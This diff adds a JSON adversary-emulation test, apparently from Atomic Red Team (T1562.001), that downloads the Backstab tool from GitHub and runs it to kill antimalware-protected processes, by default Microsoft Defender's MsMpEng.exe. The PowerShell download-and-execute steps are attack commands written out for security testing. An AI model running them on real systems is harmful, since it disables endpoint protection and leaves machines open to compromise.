@@ -1,0 +1,86 @@
+{
+  "id": "24a12b91-05a7-4deb-8d7f-035fa98591bc",
+  "name": "Kill antimalware protected processes using Backstab",
+  "description": "Backstab loads Process Explorer driver which is signed by Microsoft and use it to terminate running processes protected by antimalware software such as MsSense.exe or MsMpEng.exe, which is otherwise not possible to kill.\nhttps://github.com/Yaxser/Backstab",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "6786bb1b-598c-4c6a-b85a-e143215519ce",
+      "type": "execute-command",
+      "data": {
+        "command": "\u0026 \"PathToAtomicsFolder\\..\\ExternalPayloads\\Backstab64.exe\" -k -n #{process_name}\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "340e5021-3fba-4160-8c5f-0bc07559db23",
+      "name": "Check dependency 1/1",
+      "description": "Backstab64.exe should exist in ExtrnalPayloads Directory",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Backstab64.exe\") {exit 0} else {exit 1}",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "903fdedc-6eaa-4924-a6c8-d70b0f9ae7b8",
+      "name": "Resolve dependency 1/1",
+      "description": "Backstab64.exe should exist in ExtrnalPayloads Directory",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/Yaxser/Backstab/releases/download/v1.0.1-beta/Backstab64.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\Backstab64.exe\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "a62f2b4c-975a-4610-8a21-882700d50ede",
+      "name": "Re-check dependency 1/1",
+      "description": "Backstab64.exe should exist in ExtrnalPayloads Directory",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Backstab64.exe\") {exit 0} else {exit 1}",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "340e5021-3fba-4160-8c5f-0bc07559db23",
+      "p": "on-success",
+      "o": "6786bb1b-598c-4c6a-b85a-e143215519ce"
+    },
+    {
+      "s": "340e5021-3fba-4160-8c5f-0bc07559db23",
+      "p": "on-failure",
+      "o": "903fdedc-6eaa-4924-a6c8-d70b0f9ae7b8"
+    },
+    {
+      "s": "903fdedc-6eaa-4924-a6c8-d70b0f9ae7b8",
+      "p": "on-success",
+      "o": "a62f2b4c-975a-4610-8a21-882700d50ede"
+    },
+    {
+      "s": "a62f2b4c-975a-4610-8a21-882700d50ede",
+      "p": "on-failure",
+      "o": "6786bb1b-598c-4c6a-b85a-e143215519ce"
+    }
+  ],
+  "tags": [
+    "T1562.001",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "process_name",
+      "type": "string",
+      "description": "Name of the protected process you want to kill/terminate.",
+      "value": "MsMpEng.exe"
+    }
+  ]
+}
